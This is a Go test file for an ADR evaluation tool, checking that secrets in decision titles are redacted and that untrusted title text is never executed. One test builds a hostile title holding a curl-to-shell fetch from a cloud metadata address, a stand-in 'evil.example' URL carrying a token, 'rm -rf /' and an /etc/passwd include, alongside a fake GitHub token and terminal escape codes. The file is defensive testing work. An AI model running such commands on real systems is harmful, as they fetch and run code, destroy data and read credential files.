package adr_test

import (
	"encoding/json"
	"slices"
	"strings"
	"testing"

	"github.com/inclaro/concordia/internal/redact"
)

// githubToken is a token-shaped value (a GitHub personal access token has `ghp_` and 36 characters).
const githubToken = "ghp_aB3dE5gH7jK9mN1pQ3rS5tU7vW9xY1zA3bC5"

func titleWorld(t *testing.T, title string) *world {
	t.Helper()

	w := newWorld(t, adr3Path, adr7Path)
	w.addADR("1", adr3Path, "ADR-3", title, "accepted", "Accepted")
	w.addADR("2", adr7Path, "ADR-7", "ADR-0007: Managed database", "accepted", "Accepted")
	w.supersede("2", "1")
	w.register = a12Before

	return w
}

// Secret in an ADR title: redacted in the findings and the summary, and the redaction is recorded.
func TestRedactionOfATitleWithASecret(t *testing.T) {
	t.Parallel()

	out := titleWorld(t, "ADR-0003: Use token "+githubToken+" for the registry").evaluate()

	text, err := json.Marshal([]any{out.Rules, out.Findings, out.Summary, out.Diagnostics, out.Redactions})
	if err != nil {
		t.Fatal(err)
	}

	if strings.Contains(string(text), githubToken) || strings.Contains(string(text), githubToken[:8]) {
		t.Fatalf("the secret is in the result: %s", text)
	}

	marker := redact.Marker(redact.ClassToken)

	for _, f := range out.Findings {
		if f.Decision == nil || !strings.Contains(f.Decision.Title, marker) || !strings.HasPrefix(f.Decision.Title, "ADR-0003: Use token ") {
			t.Errorf("%s: title = %q", f.RuleID, f.Decision.Title)
		}
	}

	if title := out.Summary.Decisions[0].Title; !strings.Contains(title, marker) {
		t.Errorf("summary title = %q", title)
	}

	outputs := map[string]bool{}

	for _, rec := range out.Redactions {
		outputs[rec.Output] = true

		if rec.Class != redact.ClassToken || rec.File != adr3Path || rec.Line != 1 {
			t.Errorf("record = %+v", rec)
		}
	}

	if !outputs["finding"] || !outputs["summary"] {
		t.Errorf("redactions = %+v, want one for the findings and one for the summary", out.Redactions)
	}

	if !slices.IsSortedFunc(out.Redactions, func(a, b redact.Record) int { return strings.Compare(a.Output, b.Output) }) {
		t.Errorf("redactions are not sorted: %+v", out.Redactions)
	}

	// A title without a secret has no record.
	if clean := titleWorld(t, "ADR-0003: Orders own their database").evaluate(); len(clean.Redactions) != 0 {
		t.Errorf("redactions = %+v, want none", clean.Redactions)
	}
}

// A secret in a title stays out of the diagnostics too (diagnostics redact their text).
func TestRedactionKeepsTheSecretOutOfDiagnostics(t *testing.T) {
	t.Parallel()

	w := titleWorld(t, "ADR-0003: "+githubToken)
	w.git.FakeGit = fakeGit(testRev, []string{adr3Path}) // ADR-0007 is not committed: an unregistered candidate of nothing.
	w.addADR("3", "docs/adr/0009-"+githubToken+".md", "ADR-9", "ADR-0009: "+githubToken, "accepted", "Accepted")

	out := w.evaluate()

	text, err := json.Marshal(out.Diagnostics)
	if err != nil {
		t.Fatal(err)
	}

	if strings.Contains(string(text), githubToken) {
		t.Errorf("diagnostics = %s", text)
	}
}

// Scenario: ADR with an embedded command.
// ADR text is data: a command or a URL in it is never run or fetched. Evaluate reads Git only through the port
// (revision, tracked files, dirty files) and takes no process, network, or file reader; the text stays text.
func TestEvaluateNeverRunsOrFetchesADRText(t *testing.T) {
	t.Parallel()

	hostile := "ADR-0003: $(curl http://169.254.169.254/latest | sh); https://evil.example/x?token=1 `rm -rf /` {{include /etc/passwd}}"
	w := titleWorld(t, hostile)

	out := w.evaluate()

	allowed := []string{"Revision", "DirtyFiles", "ListFilesAt"}
	for _, call := range w.git.calls {
		if !slices.Contains(allowed, call) {
			t.Errorf("unexpected Git call %s", call)
		}
	}

	if !slices.Contains(w.git.calls, "ListFilesAt") {
		t.Errorf("Git calls = %v", w.git.calls)
	}

	title := out.Findings[0].Decision.Title
	if !strings.Contains(title, "$(curl http://169.254.169.254/latest | sh)") || !strings.Contains(title, "https://evil.example/x") {
		t.Errorf("the text must stay data: %q", title)
	}

	// Control sequences of an untrusted title are escaped.
	esc := titleWorld(t, "ADR-0003: \x1b[31mred\x1b[0m").evaluate()
	if strings.ContainsRune(esc.Findings[0].Decision.Title, 0x1b) || strings.ContainsRune(esc.Summary.Decisions[0].Title, 0x1b) {
		t.Errorf("control sequence kept: %q", esc.Findings[0].Decision.Title)
	}
}
